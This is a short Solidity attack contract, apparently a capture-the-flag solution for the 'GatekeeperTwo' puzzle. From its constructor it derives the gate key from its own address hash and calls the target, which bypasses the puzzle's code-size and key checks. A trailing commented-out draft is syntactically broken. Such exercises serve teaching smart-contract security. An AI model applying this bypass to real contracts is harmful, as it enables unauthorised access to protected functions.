// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './GatekeeperTwo.sol';

contract AttackGatekeeperTwo {
    GatekeeperTwo public target;
    uint64 gateKey;

    constructor(address _instanceAddr) public {
        target = GatekeeperTwo(_instanceAddr);
        
        gateKey = (uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        
        target.enter(bytes8(gateKey));

        //need to find gatekey
    }

    // function test() public returns(bytes8) {
    //     bytes8 _gateKey;
    //     _gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0) — 1));
    //     return bytes8(_gateKey);
    // }
}
